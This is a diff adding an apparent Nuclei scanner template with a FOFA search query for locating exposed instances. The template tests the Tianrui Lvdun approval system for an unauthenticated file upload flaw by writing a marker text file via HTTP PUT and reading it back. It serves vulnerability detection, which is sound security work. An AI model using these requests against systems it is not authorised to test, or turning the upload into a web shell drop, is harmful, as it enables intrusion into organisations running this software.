@@ -1,0 +1,43 @@
+id: tianruiludun-trwfe-PUT-upload
+info:
+  tags: tianruiludun-trwfe-PUT-upload
+  name: 天锐绿盾审批系统某接口存在文件上传漏洞
+  author: xc
+  severity: high
+  description: |-
+     fofa:body="trwfe" && body="location.href=location.href"
+     此审批系统是一款企业级审批管理软件，旨在优化和简化审批流程。系统支持多级审批、流程自定义、数据统计与分析等功能，能够高效管理各种审批请求，如请假、报销等。通过自动化和智能化的审批机制，天锐绿盾帮助企业提高审批效率，减少人为错误，并实现透明化管理。
+
+variables:
+  filename: "{{to_lower(rand_base(8))}}"
+
+http:
+  - raw:
+      - |
+        PUT /trwfe/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+        Pragma: no-cache
+        Cache-Control: no-cache
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 11
+
+        123963
+
+      - |
+        GET /trwfe/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36
+        Connection: close
+        Accept-Encoding: gzip
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_2 ==200 &&contains_all(body_2,"123963")
